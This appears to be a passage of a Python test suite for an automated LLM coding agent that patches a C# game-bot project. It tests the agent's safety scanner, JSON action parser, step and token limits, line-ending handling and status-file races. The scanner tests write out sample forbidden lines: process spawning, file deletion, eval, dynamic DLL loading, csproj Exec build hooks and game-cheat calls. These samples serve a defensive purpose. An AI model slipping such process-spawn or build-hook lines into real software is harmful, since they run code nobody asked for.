    check("scan: the namespace exemption does not cover a real network class", "net-nonlocal" in rules_of(r), r)
    r = scan("src/Bot.cs", ["    Environment.Exit(0);", "    Application.Quit();"])
    check("scan: Environment.Exit and Application.Quit are rejected", "exit" in rules_of(r))
    r = scan("src/Bot.cs", ["    var a = Assembly.LoadFrom(path);", "    [DllImport(\"kernel32.dll\")] static extern int X();"])
    check("scan: dynamic assembly loading and P/Invoke are rejected", "dynamic-load" in rules_of(r))
    r = scan("src/Bot.cs", ["    pm.TeleportTo(target);"])
    check("scan: pm.TeleportTo (a pattern read from tools/bot-lint.ps1) is rejected", "cheat-api" in rules_of(r), r)
    r = scan("src/Bot.cs", ["    hp.TakeDamage(5f);", "    Cheats.GodHero = true;", "    heroAttack.Attack();"], lint="")
    check("scan: built-in cheat names (TakeDamage, Cheats.*, heroAttack.Attack) are rejected even without the lint script", "cheat-api" in rules_of(r) and len(r["violations"][0]["lines"]) >= 2, r)
    r = scan("src/Bot.cs", ["    pm.TeleportTo(target);"], removed=["    pm.TeleportTo(target);"])
    check("scan: re-adding an existing line is neutral (net-new accounting)", not r["violations"], r)
    r = scan("src/Bot.cs", ["    pm.TeleportTo(target);"], removed=["    System.Diagnostics.Process.GetCurrentProcess();"])
    check("scan: deleting some OTHER matching line does not offset a new violation (the removed line must be identical)", "cheat-api" in rules_of(r), r)
    r = scan("src/Bot.cs", ["    System.Diagnostics.Process.Start(newPath);"], removed=["    System.Diagnostics.Process.Start(oldPath);"])
    check("scan: changing the arguments of an existing flagged call counts as a new violation", "process-spawn" in rules_of(r), r)
    r = scan("src/Bot.cs", ["        pm.TeleportTo(target);   "], removed=["    pm.TeleportTo(target);"])
    check("scan: re-indenting / re-spacing an identical existing line is neutral", not r["violations"], r)
    r = scan("src/Bot.cs", ["    pm.TeleportTo(a);", "    pm.TeleportTo(a);"], removed=["    pm.TeleportTo(a);"])
    check("scan: a removed line offsets only as many identical added lines as were removed (1 removed, 2 added = 1 new)", "cheat-api" in rules_of(r), r)
    r = scan("src/Bot.cs", ["    // pm.TeleportTo(target) was removed", "    /* Process.Start */"])
    check("scan: comment lines are ignored", not r["violations"], r)
    r = scan("src/Bot.cs", ["    var x = a + b; // see http://evil.example.com for details"])
    check("scan: a trailing comment does not hide or trigger anything", not r["violations"], r)
    r = scan("tools/x.py", ["import subprocess", "subprocess.run(['calc'])", "os.remove(p)", "eval(code)"])
    check("scan: python rules (subprocess / os.remove / eval) apply to .py files", {"process-spawn", "file-delete", "dynamic-load"} <= set(rules_of(r)), r)
    r = scan("tools/x.py", ["x = re.compile('a')", "r = os.replace(a, b)", "d = {'k': 1}"])
    check("scan: re.compile / os.replace are not mistaken for eval/compile/remove", not r["violations"], r)
    r = scan("docs/NOTES.md", ["use Process.Start and subprocess.run and pm.TeleportTo( in the examples"])
    check("scan: documentation files are never scanned", not r["violations"] and not r["warnings"])
    r = scan("src/ThronefallTrainer.csproj", ["  <Target Name=\"x\" AfterTargets=\"Build\"><Exec Command=\"calc\"/></Target>"])
    check("scan: build-system hooks in a csproj (Target/Exec) are rejected", "msbuild-exec" in rules_of(r))
    r = scan("src/ThronefallTrainer.csproj", ["  <Reference Include=\"UnityEngine.AIModule\"><HintPath>$(GameDir)\\x.dll</HintPath></Reference>"])
    check("scan: adding a plain game-DLL <Reference> to the csproj is allowed", not r["violations"], r)
    r = scan("tests/test_picker.py", ["        self.assertTrue(True)"], removed=["        self.assertEqual(picker.pick_next(HERO, SITES, {\"a\"})[\"id\"], \"b\")"])
    check("scan: removing/changing lines of an EXISTING test file is a warning (the baseline comparison cannot see a weakened test) - human review, no auto-apply",
          not r["violations"] and [w["rule"] for w in r["warnings"]] == ["tests-weakened"] and "assertEqual" in r["warnings"][0]["lines"][0], r)
    r = scan("tests/test_picker.py", ["    def test_new(self):", "        self.assertTrue(True)"])
    check("scan: only ADDING test code (the normal way to extend tests) raises nothing", not r["violations"] and not r["warnings"], r)
    r = me.scan_diff(me.parse_diff(me.make_file_diff("tests/test_new.py", None, b"x = 1\n")), "")
    check("scan: a brand-new test file is never 'weakened'", not r["warnings"])
    r = scan("src/Patcher.cs", ["    [HarmonyPatch(typeof(Hp), \"Heal\")]", "    Time.timeScale = 3f;", "    new Thread(Work).Start();"])
    check("scan: Harmony patches, timeScale writes and new threads are warnings (human review), not violations", not r["violations"] and {w["rule"] for w in r["warnings"]} == {"harmony-patch", "timescale", "threads"}, r)
    check("scan: lint_cheat_patterns reads rx = '...' entries from the lint script", me.lint_cheat_patterns(LINT) == [r"pm\.TeleportTo\(", r"Hp\.TakeDamage\("], me.lint_cheat_patterns(LINT))
    real_lint = HERE.parent / "tools" / "bot-lint.ps1"
    if real_lint.exists():
        pats = me.lint_cheat_patterns(real_lint.read_text(encoding="utf-8", errors="replace"))
        check("scan: the repo's real tools/bot-lint.ps1 yields its 3 cheat patterns", len(pats) >= 3 and any("TeleportTo" in p for p in pats), pats)

    # end to end: a created .cs file with a forbidden call blocks the finish, the model gets the reason, and a fixed version passes
    evil = "class E { void F() { System.Diagnostics.Process.Start(\"calc\"); } }\n"
    ok_cs = "class E { void F() { } }\n"
    env = Env(tmp, "scan_e2e", replies=[FIX, {"action": "create", "path": "src/Evil.cs", "content": evil}, BUILD, TEST, FINISH,
                                         {"action": "edit", "path": "src/Evil.cs", "old": evil.strip(), "new": ok_cs.strip()}, FINISH])
    res = env.eng.run_task("E0003")
    refused = env.obs(6)
    check("scan e2e: finish is refused with a SAFETY SCAN message naming the rule and the line", "FINISH REFUSED" in refused and "SAFETY SCAN: process-spawn in src/Evil.cs" in refused and "Process.Start" in refused, refused[:400])
    check("scan e2e: after the model removes the call the same run finishes as patched", res["status"] == "patched" and "Process.Start" not in (env.agent / "engineer" / "E0003.diff").read_text(), res)
    evil_test = "import subprocess\nsubprocess.run(['calc'])\n"
    env = Env(tmp, "scan_preexec", replies=[{"action": "create", "path": "tests/test_evil.py", "content": evil_test}, TEST, BUILD, {"action": "edit", "path": "tests/test_evil.py", "old": "import subprocess\nsubprocess.run(['calc'])", "new": "x = 1"}, TEST])
    env.eng.run_task("E0003")
    check("scan before execution: a test file with a forbidden call is NOT run (test and build are refused before anything executes)", "test NOT run: the safety scan rejects your current edits (process-spawn in tests/test_evil.py" in env.obs(3) and "build NOT run" in env.obs(4) and len(env.runner.build_calls) == 0, (env.obs(3)[:300], env.runner.test_calls, env.runner.build_calls))
    check("scan before execution: once the offending lines are gone the same test action runs (work tree + one baseline run, nothing before)", "TESTS" in env.obs(6) and len(env.runner.test_calls) == 2, (env.obs(6)[:200], env.runner.test_calls))
    env = Env(tmp, "scan_e2e2", replies=[FIX, {"action": "create", "path": "src/Tp.cs", "content": "class T { void F() { pm.TeleportTo(x); } }\n"}, FINISH], cfg={"max_steps": 4})
    env.eng.run_task("E0003")
    check("scan e2e: a cheat call added to a created file is refused at finish (pattern read from the sandbox lint script)", "cheat-api" in env.obs(4) and "FINISH REFUSED" in env.obs(4), env.obs(4)[:300])
    rec = env.rec()
    check("scan e2e: the refused attempt is recorded in the sidecar gates (safety violation with rule and file) and the run did not produce a patch",
          rec["status"] == "failed" and rec["gates"]["safety"]["violations"][0]["rule"] == "cheat-api" and rec["gates"]["safety"]["violations"][0]["file"] == "src/Tp.cs" and not rec.get("diff_path"), rec.get("gates"))


# ================================================================================================================ E. protocol
def test_protocol():
    check("extract_json: prose around the object", me.extract_json('Sure thing! {"action":"ls"} hope that helps')["action"] == "ls")
    check("extract_json: markdown fence", me.extract_json('```json\n{"action":"build"}\n```')["action"] == "build")
    check("extract_json: <think> blocks are ignored (their braces too)", me.extract_json('<think>maybe {"action":"test"}</think>{"action":"build"}')["action"] == "build")
    check("extract_json: a brace pair that is not JSON is skipped", me.extract_json('use {x} then {"action":"ls","path":"src"}')["path"] == "src")
    check("extract_json: raw newlines inside strings and a trailing comma are tolerated", me.extract_json('{"action":"edit","old":"a\nb","new":"c",}')["old"] == "a\nb")
    check("extract_json: braces inside strings do not confuse the scanner", me.extract_json('{"action":"edit","old":"if (x) { y(); }","new":"}"}')["old"] == "if (x) { y(); }")
    check("extract_json: nothing parseable -> None", me.extract_json("no json here") is None and me.extract_json('{"a": ') is None)
    t0 = time.time()
    degenerate = ["{" * 20000 + "}" * 20000, "{[" * 15000, '{"a":' * 8000 + "1" + "}" * 8000, "{x}" * 30000, "[" * 100000, '{"action":' + "[" * 60000 + "]" * 60000 + "}"]
    ok = True
    for d in degenerate:
        try:
            me.parse_action(d)
            ok = False
        except me.ProtocolError:
            pass
    check("extract_json: degenerate replies (deep nesting, endless braces, 100k brackets) are rejected as invalid, quickly (no RecursionError, no quadratic scan)", ok and time.time() - t0 < 10, time.time() - t0)
    check("parse_action: field aliases and nested args (tool/args/ignore_case/from-to)", me.parse_action('{"tool":"search","args":{"pattern":"x","ignore_case":true}}')[1] == {"pattern": "x", "i": True, "max": None, "glob": None}
          and me.parse_action('{"action":"cat","path":"a","from":"3","to":9}')[1] == {"path": "a", "start": 3, "end": 9})
    for bad, why in (('{"action":"dance"}', "unknown action"), ('{"path":"x"}', "no action"), ('{"action":"read"}', "read without path"), ('{"action":"edit","path":"a","old":"x"}', "edit without new"),
                     ('{"action":"grep","pattern":""}', "empty pattern"), ('{"action":"read","path":"a","start":"abc"}', "bad number"), ("plain prose", "prose")):
        try:
            me.parse_action(bad)
            check("parse_action: %s is a ProtocolError" % why, False)
        except me.ProtocolError:
            check("parse_action: %s is a ProtocolError" % why, True)
    check("parse_action: edit with an empty 'new' is valid (deletion)", me.parse_action('{"action":"edit","path":"a","old":"x","new":""}')[1]["new"] == "")
    check("compact_action: long strings are shortened but the result is valid JSON", len(me.compact_action("edit", {"path": "a", "old": "x" * 5000, "new": "y"})) < 800 and json.loads(me.compact_action("edit", {"path": "a", "old": "x" * 5000, "new": "y"}))["action"] == "edit")


# ================================================================================================================ F. agent loop
def test_happy_path(tmp):
    env = Env(tmp, "happy", replies=[{"action": "ls", "path": "src"}, {"action": "grep", "pattern": "def pick_next", "glob": "src/*.py"}, {"action": "read", "path": "src/picker.py", "start": 1, "end": 40},
                                     {"action": "edit", "path": "src/picker.py", "old": "best = site", "new": "best = site  # nearest so far"}] + HAPPY)
    qhash = sha(env.agent / "engineer-queue.jsonl")
    snaps = []
    res = env.eng.run_task("E0003", progress_cb=lambda i: snaps.append((i, env.eng.status()["current"])))
    rec = env.rec()
    check("happy path: status patched after 8 steps (ls, grep, read, wrong edit, correct edit, build, test, finish)", res["status"] == "patched" and rec["status"] == "patched" and rec["steps"] == 8, rec.get("steps"))
    obs5 = env.obs(5)
    check("happy path: the non-unique edit was rejected and the model was told the count and the lines", "ERROR: old text occurs 2 times (lines 20, 35)" in obs5, obs5[:300])
    check("happy path: grep and read observations carry real workspace data", "src/picker.py:9: def pick_next" in env.obs(3) and "   17|     for site in sites:" in env.obs(4), (env.obs(3)[:200], env.obs(4)[:200]))
    diff = (env.agent / "engineer" / "E0003.diff").read_text()
    check("happy path: the exported diff is exactly the fix (a/ b/ paths, +2 lines)", diff.startswith("diff --git a/src/picker.py b/src/picker.py\n") and "+        if site[\"id\"] in blocked:\n+            continue\n" in diff and diff.count("\n+") == 3, diff)
    check("happy path: sidecar has the documented fields", all(k in rec for k in ("status", "started", "finished", "steps", "tokens", "diff_path", "gates", "summary", "error")) and rec["diff_path"] == str(env.agent / "engineer" / "E0003.diff"), sorted(rec))
    check("happy path: gates are all recorded as passed (limits, safety, build, tests, lint)", all(rec["gates"][k]["ok"] for k in ("limits", "safety", "build", "tests", "lint")) and rec["gates"]["tests"]["preexisting"] == [], rec["gates"])
    check("happy path: tokens are summed from the usage the chat function reports (8 calls x 600)", rec["tokens"] == 4800, rec["tokens"])
    check("happy path: diff_sha256 and diff_stats are stored", rec["diff_sha256"] == hashlib.sha256(diff.encode()).hexdigest() and rec["diff_stats"]["files"] == ["src/picker.py"] and rec["diff_stats"]["added"] == 2, rec["diff_stats"])
    check("happy path: the queue file is never modified (append-only contract)", sha(env.agent / "engineer-queue.jsonl") == qhash)
    check("happy path: the real tree was not touched by the run", (env.repo / "src" / "picker.py").read_bytes().decode() == sim.PICKER)
    check("happy path: progress callback fired and status()['current'] showed the live step", len(snaps) >= 8 and snaps[3][1] is not None and snaps[3][1]["id"] == "E0003" and snaps[3][1]["op"] == "run" and env.eng.status()["current"] is None, snaps[3][1] if len(snaps) > 3 else None)
    tlog = env.agent / "engineer" / "E0003.log.jsonl"
    rows = [json.loads(l) for l in tlog.read_text().splitlines()]
    check("happy path: a transcript (one JSON line per step) is written", len(rows) == 8 and rows[3]["action"] == "edit" and "ERROR" in rows[3]["result"], len(rows))
    check("happy path: workspace base/ and work/ exist; base is untouched, work has the fix", (env.agent / "engineer" / "work" / "E0003" / "base" / "src" / "picker.py").read_text() == sim.PICKER
          and "in blocked" in (env.agent / "engineer" / "work" / "E0003" / "work" / "src" / "picker.py").read_text())
    check("happy path: no lock file is left behind", not (env.agent / "engineer" / "engineer.lock").exists())


def test_crlf_tabs_loop(tmp):
    """The real src/Bot.cs is CRLF + TABs. The whole loop on such a sandbox: the model sees tabs/CRLF flagged, writes \\t in JSON, the patch applies byte-exactly."""
    env = Env(tmp, "crlf_tabs", replies=sim.mock_script(True), crlf_tabs=True)
    res = env.eng.run_task("E0003")
    check("crlf+tabs loop: a scripted run on a CRLF + TAB sandbox ends patched", res["status"] == "patched", env.rec().get("error"))
    check("crlf+tabs loop: read tells the model the file indents with tabs and is CRLF", "(indent: tabs, CRLF)" in env.obs(4), env.obs(4)[:160])
    diff = (env.agent / "engineer" / "E0003.diff").read_bytes()
    check("crlf+tabs loop: the diff is byte-exact - CRLF content lines, TAB indentation, LF-only headers",
          b"+\t\tif site[\"id\"] in blocked:\r\n" in diff and b" \tfor site in sites:\r\n" in diff and b"diff --git a/src/picker.py b/src/picker.py\n" in diff, diff[:300])
    real, eng_real = env.real()
    os.environ["GIT_CONFIG_COUNT"], os.environ["GIT_CONFIG_KEY_0"], os.environ["GIT_CONFIG_VALUE_0"] = "1", "core.autocrlf", "true"
    try:
        r = eng_real.apply_patch("E0003")
    finally:
        for k in ("GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0", "GIT_CONFIG_VALUE_0"):
            os.environ.pop(k, None)
    got = (real / "src" / "picker.py").read_bytes()
    check("crlf+tabs loop: applied to the live-tree copy it stays CRLF + tabs, byte-identical to the workspace result, even with autocrlf=true configured",
          r["ok"] and got == (env.agent / "engineer" / "work" / "E0003" / "work" / "src" / "picker.py").read_bytes() and got.count(b"\n") == got.count(b"\r\n") and b"\t\tif site" in got, r)
    ws, root = make_ws(tmp, "ws_tabs", {"src/t.cs": b"class A\r\n{\r\n\tvoid F()\r\n\t{\r\n\t\tint x = 1;\r\n\t}\r\n}\r\n"})
    try:
        ws.edit("src/t.cs", "    void F()\n    {\n        int x = 1;", "x")
        check("crlf+tabs: a model that types spaces instead of tabs is rejected", False)
    except me.ActionError as ex:
        check("crlf+tabs: a model that types spaces instead of tabs is rejected with the exact tab text and a hint", "DIFFERENT WHITESPACE" in str(ex) and "\t\tint x = 1;" in str(ex) and "TABs" in str(ex), ex)
    ws.edit("src/t.cs", "\tvoid F()\n\t{\n\t\tint x = 1;", "\tvoid F()\n\t{\n\t\tint x = 2;")
    check("crlf+tabs: with the exact tabs the edit works and the file stays CRLF", (root / "work" / "src" / "t.cs").read_bytes() == b"class A\r\n{\r\n\tvoid F()\r\n\t{\r\n\t\tint x = 2;\r\n\t}\r\n}\r\n")


def test_conversation_bounded(tmp):
    env = Env(tmp, "bounded", replies=[{"action": "ls", "path": "src"}] * 3 + [{"action": "grep", "pattern": "blocked"}] * 3 + [{"action": "read", "path": "src/picker.py", "start": 1, "end": 20}] * 3 + HAPPY)
    env.eng.run_task("E0003")
    sizes = [len(c["messages"]) for c in env.chat.calls]
    check("conversation: never more than system + task + 6 exchanges (14 messages), however many steps ran", max(sizes) == 14 and sizes[:3] == [2, 4, 6], sizes)
    last = env.chat.calls[-1]["messages"]
    first = last[1]["content"]
    check("conversation: older steps are folded into the task message as one-line summaries", "EARLIER STEPS" in first and " 1. ls src" in first and " 4. grep /blocked/ ->" in first, first[-700:])
    check("conversation: the running edit log and the build/test state line are always shown (here: fix edited, build ok, tests passed)",
          "YOUR EDITS SO FAR" in first and "src/picker.py line 17: replaced 3 line(s) with 5 line(s)" in first and "STATE: 1 file(s) edited | build: ok | tests: passed | gate attempts failed: 0" in first, first[-400:])
    st_first = env.chat.calls[0]["messages"][1]["content"]
    check("conversation: before any edit the state line says nothing was built or tested", "STATE: 0 file(s) edited | build: not run | tests: not run" in st_first)
    check("conversation: roles alternate system, user, assistant, user, ... and end with the user observation", [m["role"] for m in last] == ["system", "user"] + ["assistant", "user"] * 6)
    check("conversation: observations carry the step/token/time budget header", env.obs(5).startswith("OBSERVATION [step 4/28, 24 left | tokens 2k/400k | time 0:00/14:00]"), env.obs(5)[:120])
    check("conversation: the system prompt states the rules the spec requires", all(s in env.chat.calls[0]["messages"][0]["content"] for s in ("senior C# engineer", "LEGIT player", "SMALLEST change", "GUESSES", "ONE JSON object", "build and then test")))
    check("conversation: max_tokens=8000 is requested from the chat function", all(c["max_tokens"] == 8000 for c in env.chat.calls))
    first_msg = env.chat.calls[0]["messages"][1]["content"]
    check("conversation: the first message grounds the guessed names (missing file/symbol, similar file, keyword hits)", "file 'src/Bot.cs' does NOT exist; similar: src/picker.py" in first_msg and "symbol 'PickNext'" in first_msg and "pick_next" in first_msg and "defined at src/picker.py:9" in first_msg, first_msg[first_msg.index("GROUNDING"):first_msg.index("WORKSPACE")])


def test_protocol_failures(tmp):
    env = Env(tmp, "invalid1", replies=["I think we should look at the code first.", {"action": "ls", "path": "src"}] + HAPPY)
    res = env.eng.run_task("E0003")
    check("invalid JSON: one corrective retry - the model is told what was wrong and the run continues to a patch", res["status"] == "patched" and "was not accepted: no valid JSON object" in env.obs(2) and "Reply with exactly ONE JSON object" in env.obs(2), env.obs(2)[:200])
    env = Env(tmp, "invalid3", replies=["blah", "still blah", "{\"action\": \"explode\"}", {"action": "ls"}])
    res = env.eng.run_task("E0003")
    rec = env.rec()
    check("invalid JSON: three invalid replies in a row abort the run (status failed, reason protocol)", res["status"] == "failed" and rec["status"] == "failed" and "protocol" in rec["error"] and rec["steps"] == 3, rec)
    env = Env(tmp, "invalid_reset", replies=["blah", "blah", {"action": "ls"}, "blah", "blah", {"action": "ls"}] + HAPPY)
    res = env.eng.run_task("E0003")
    check("invalid JSON: the streak resets after a valid action (2+2 invalid replies are not an abort)", res["status"] == "patched", env.rec())
    env = Env(tmp, "unknown_action", replies=[{"action": "rm", "path": "src"}, {"action": "ls"}] + HAPPY)
    env.eng.run_task("E0003")
    check("invalid JSON: an unknown action name counts as invalid and lists the valid ones", "unknown action 'rm'" in env.obs(2) and "finish" in env.obs(2))
    env = Env(tmp, "two_actions", replies=['{"action":"ls","path":"src"}\n{"action":"build"}'] + HAPPY)
    env.eng.run_task("E0003")
    check("several actions in one reply: only the first runs and the model is told so", "src/ - 1 entries" in env.obs(2) and "only the FIRST was executed" in env.obs(2) and "BUILD" not in env.obs(2).split("NOTE:")[0], env.obs(2)[:300])
    env = Env(tmp, "think_prefix", replies=['<think>I should read first {"action":"build"}</think>Here is my action: {"action":"ls","path":"src"}'] + HAPPY)
    env.eng.run_task("E0003")
    check("reasoning text and a <think> block before the JSON do not matter", "src/ - 1 entries" in env.obs(2) and "only the FIRST" not in env.obs(2))


def test_limits(tmp):
    env = Env(tmp, "steps", replies=[{"action": "ls", "path": "src"}] * 40, cfg={"max_steps": 5})
    res = env.eng.run_task("E0003")
    rec = env.rec()
    check("limits: max_steps stops the run (status failed, reason step-limit, exactly max_steps model calls)", rec["status"] == "failed" and "step-limit" in rec["error"] and len(env.chat.calls) == 5 and rec["steps"] == 5, rec)
    check("limits: a warning appears when only a few steps are left", "step 1/5, 4 left" in env.obs(2) and "WARNING" not in env.obs(2) and "WARNING: only 3 step(s) left" in env.obs(3) and "only 1 step(s) left" in env.obs(5), (env.obs(3)[:200], env.obs(5)[:200]))
    env = Env(tmp, "tokens", replies=[{"action": "ls"}] * 20, cfg={"max_tokens_total": 2500}, tokens=1000)
    env.eng.run_task("E0003")
    check("limits: max_tokens_total stops the run (token-limit)", "token-limit" in env.rec()["error"] and len(env.chat.calls) == 3, env.rec())
    clk = Clock()
    env = Env(tmp, "wall", replies=[{"action": "ls"}] * 20, cfg={"wall_timeout_s": 100}, clock=clk, advance=40.0)
    env.eng.run_task("E0003")
    check("limits: the wall-clock limit stops the run (wall-timeout) - measured with the injected clock", "wall-timeout" in env.rec()["error"] and len(env.chat.calls) == 3, env.rec())
    env = Env(tmp, "failed_diff", replies=[FIX] + [{"action": "ls"}] * 10, cfg={"max_steps": 4})
    env.eng.run_task("E0003")
    rec = env.rec()
    check("limits: a failed run keeps the model's partial work as <id>.failed.diff for inspection (never as the patch)", rec["status"] == "failed" and Path(rec["failed_diff_path"]).is_file() and not rec.get("diff_path") and "in blocked" in Path(rec["failed_diff_path"]).read_text(), rec)
    big = "\n".join("v%d = %d" % (i, i) for i in range(300)) + "\n"
    env = Env(tmp, "changed_lines", replies=[{"action": "create", "path": "src/g1.py", "content": big}, {"action": "create", "path": "src/g2.py", "content": big}, {"action": "finish", "summary": "x"}], cfg={"max_steps": 3})
    env.eng.run_task("E0003")
    check("limits: max_changed_lines (400) is enforced while editing - the 2nd 300-line file is refused", "edit refused: the patch would change 600 lines (limit 400" in env.obs(3), env.obs(3)[:300])
    env = Env(tmp, "files", replies=[{"action": "create", "path": "src/f%d.py" % i, "content": "x = %d\n" % i} for i in range(7)] + [FINISH], cfg={"max_steps": 8})
    env.eng.run_task("E0003")
    check("limits: max_files (6) is enforced while editing - the 6th file is fine, the 7th is refused", "CREATE OK src/f5.py" in env.obs(7) and "touch 7 files (limit 6)" in env.obs(8), (env.obs(7)[:200], env.obs(8)[:200]))


def test_real_git_repo_autocrlf(tmp):
    """The reason apply uses `-c core.autocrlf=false`: inside a REAL git repo configured with autocrlf=true (as this machine's system git is), a plain `git apply`
    would rewrite every patched LF file to CRLF. The engineer's patch must change exactly the lines it touches in a CRLF file AND in an LF file."""
    def git(*a, cwd):
        r = subprocess.run(["git"] + list(a), cwd=str(cwd), capture_output=True, text=True)
        return (r.stdout + r.stderr).strip()
    repo = sim.make_sandbox(Path(tmp) / "gitrepo" / "repo", crlf_tabs=True)
    (repo / "src" / "lf_file.py").write_bytes(b"A = 1\nB = 2\nC = 3\nD = 4\n")
    for cmd in (("init", "-q"), ("config", "user.email", "t@example.com"), ("config", "user.name", "t"), ("config", "core.autocrlf", "true"), ("add", "-A"), ("commit", "-q", "-m", "init")):
        git(*cmd, cwd=repo)
    agent = Path(tmp) / "gitrepo" / "agent"
    sim.write_queue(agent, [dict(sim.TASK)])
    script = [{"action": "edit", "path": "src/lf_file.py", "old": "B = 2", "new": "B = 22"},
              {"action": "edit", "path": "src/picker.py", "old": sim.to_tabs(sim.FIX_OLD), "new": sim.to_tabs(sim.FIX_NEW)}, {"action": "finish", "summary": "two files"}]
    eng = me.Engineer(str(repo), str(agent), sim.ScriptedChat(script), cfg=sim.sandbox_cfg(), runner=FastRunner(), log=lambda m: None, sleep=lambda s: None)
    res = eng.run_task("E0003")
    before = {p: (repo / p).read_bytes() for p in ("src/picker.py", "src/lf_file.py", "tests/test_picker.py")}
    ap = eng.apply_patch("E0003")
    after = {p: (repo / p).read_bytes() for p in before}
    check("git repo with autocrlf=true: a two-file patch (one CRLF+tab file, one LF file) runs and applies", res["status"] == "patched" and ap["ok"], (res, ap))
    check("git repo with autocrlf=true: the CRLF file keeps CRLF and gains exactly 2 lines; the LF file stays LF (git did not convert it); untouched files are identical",
          after["src/picker.py"].count(b"\n") == after["src/picker.py"].count(b"\r\n") == before["src/picker.py"].count(b"\n") + 2 and after["src/lf_file.py"] == b"A = 1\nB = 22\nC = 3\nD = 4\n"
          and after["tests/test_picker.py"] == before["tests/test_picker.py"])
    stat = git("diff", "--stat", cwd=repo)
    check("git repo with autocrlf=true: `git diff --stat` shows exactly the two intended files and 3 insertions / 1 deletion (no line-ending churn)",
          "src/lf_file.py" in stat and "src/picker.py" in stat and "2 files changed, 3 insertions(+), 1 deletion(-)" in stat and git("status", "--short", cwd=repo).count("\n") == 1, stat)


def test_sidecar_races(tmp):
    env = Env(tmp, "sidecar", tasks=[dict(sim.TASK, id="E0001", function="A"), dict(sim.TASK, id="E0002", function="B")])
    env.eng._update("E0001", status="deployed", summary="keep me")
    env.eng._update("E0002", status="patched", summary="and me")
    # 1. transient read failure while the writer replaces the file: retried, never read as 'empty'
    real_open, fails = open, [0]

    def flaky_open(path, *a, **k):
        if str(path).endswith("engineer-status.json") and fails[0] < 3:
            fails[0] += 1
            raise PermissionError(13, "Permission denied (file is being replaced)")
        return real_open(path, *a, **k)
    me.open = flaky_open                                                # module-level name shadows the builtin inside mm_engineer only
    try:
        env.eng._update("E0001", note="written during the race")
    finally:
        del me.open
    side = json.loads((env.agent / "engineer-status.json").read_text())
    check("sidecar race: a read that fails 3 times while the file is being replaced is retried - no task record was lost by the next write", fails[0] == 3 and side["E0002"]["summary"] == "and me" and side["E0001"]["note"] == "written during the race" and side["E0001"]["summary"] == "keep me", (fails, side))
    # 2. a persistently unreadable sidecar must make the write FAIL, not overwrite everything with an empty view
    def always_locked(path, *a, **k):
        if str(path).endswith("engineer-status.json"):
            raise PermissionError(13, "Permission denied")
        return real_open(path, *a, **k)
    before = (env.agent / "engineer-status.json").read_bytes()
    me.open = always_locked
    saved_sleep = me.time.sleep
    me.time.sleep = lambda s: None
    try:
        try:
            env.eng._update("E0002", note="must not be written")
            wrote = True
        except OSError:
            wrote = False
        view = env.eng._load_status()
    finally:
        del me.open
        me.time.sleep = saved_sleep
    check("sidecar race: when the sidecar stays unreadable the update raises and the file is left exactly as it was (no silent reset to empty)", wrote is False and (env.agent / "engineer-status.json").read_bytes() == before, wrote)
    check("sidecar race: a non-strict reader (UI view) gets an empty view instead of an exception", view == {})
    # 3. a corrupt sidecar is moved aside, the engineer carries on with a fresh one
    (env.agent / "engineer-status.json").write_text("{this is not json")
    me.time.sleep = lambda s: None
    try:
        env.eng._update("E0001", status="queued", note="after corruption")
    finally:
        me.time.sleep = saved_sleep
    moved = list(env.agent.glob("engineer-status.json.corrupt-*"))
    check("sidecar race: a corrupt sidecar is preserved as engineer-status.json.corrupt-<ts> and a fresh one is started", len(moved) == 1 and moved[0].read_text() == "{this is not json" and json.loads((env.agent / "engineer-status.json").read_text())["E0001"]["note"] == "after corruption")
    # 4. the deploy cooldown record: unreadable = refuse, never 'no deploy yet'
    env.eng._update("E0001", status="applied", needs_plugin_deploy=True)
    me.open = lambda path, *a, **k: (_ for _ in ()).throw(PermissionError(13, "locked")) if str(path).endswith("state.json") else real_open(path, *a, **k)
    me.time.sleep = lambda s: None
    try:
        r = env.eng.deploy("E0001", confirm=True)
    finally:
        del me.open
        me.time.sleep = saved_sleep
    check("deploy guard: an unreadable cooldown state refuses the deploy (it must not read as 'never deployed')", r["ok"] is False and "cooldown state" in r["error"] and env.deployer.deploys == 0, r)
    # 5. an unreadable lock file counts as held
    (env.agent / "engineer").mkdir(parents=True, exist_ok=True)
    (env.agent / "engineer" / "engineer.lock").write_text(json.dumps({"pid": os.getppid(), "t": time.time()}))
    me.open = lambda path, *a, **k: (_ for _ in ()).throw(PermissionError(13, "locked")) if str(path).endswith("engineer.lock") else real_open(path, *a, **k)
    me.time.sleep = lambda s: None
    try:
        held = env.eng._foreign_lock_active()
    finally:
        del me.open
        me.time.sleep = saved_sleep
    check("lock file: a lock that exists but cannot be read right now is treated as held (no second operation sneaks in)", held is True)
    (env.agent / "engineer" / "engineer.lock").unlink()
    # 6. concurrent pollers while the engineer updates: no update is lost, readers never see torn data
    stop, errs, reads = threading.Event(), [], [0]

    def poller(kind):
        while not stop.is_set():
            try:
                if kind == 0:
                    json.dumps(env.eng.queue())
                else:
                    env.eng.status()
                reads[0] += 1
            except Exception as ex:
                errs.append("%s: %s" % (type(ex).__name__, ex))
            time.sleep(0.003)
    ths = [threading.Thread(target=poller, args=(k,)) for k in (0, 1, 1)]
    for t in ths:
        t.start()
    for i in range(60):
        env.eng._update("E0002", tokens=i)
    stop.set()
    for t in ths:
        t.join()
    final = json.loads((env.agent / "engineer-status.json").read_text())
    check("concurrent pollers: 60 sidecar updates with 3 threads hammering queue()/status(): no exception, no lost update, other records intact", not errs and final["E0002"]["tokens"] == 59 and final["E0001"]["note"] == "after corruption" and reads[0] > 10, (errs[:2], reads[0]))


def test_fuzz_model_output(tmp):
    """Arbitrary model output must never raise anything but ProtocolError (parser) / ActionError (workspace actions) - an unattended run cannot be crashed by a reply."""
    rnd = random.Random(1234)
    junk = ["{", "}", '"', "\\", "\n", "\r\n", "action", "read", "path", ":", ",", "[", "]", "null", "true", "1e999", "\x00", "<think>", "</think>", "```", "src/x", "..", "\u2028", " ", "\t"]
    bad = []
    for _ in range(2500):
        s = "".join(rnd.choice(junk) for _ in range(rnd.randint(0, 30)))
        try:
            me.parse_action(s)
        except me.ProtocolError:
            pass
        except Exception as ex:
            bad.append("parse_action(%r): %s %s" % (s[:40], type(ex).__name__, ex))
    vals = [None, True, False, 0, -1, 5, 3.7, 1e30, "", " ", "src", "src/picker.py", "../x", "a" * 5000, "\x00", [], {}, ["x"], {"a": 1}, "()", "(a+)+", "[", "\\", "src/*.py", "\u00e9", "src/picker.py\n", "C:\\x", "nul"]
    ws, root = make_ws(tmp, "fuzz")
    done = 0
    for _ in range(2500):
        obj = {"action": rnd.choice(["ls", "read", "grep", "edit", "create", "build", "test", "finish", "x", 5, None])}
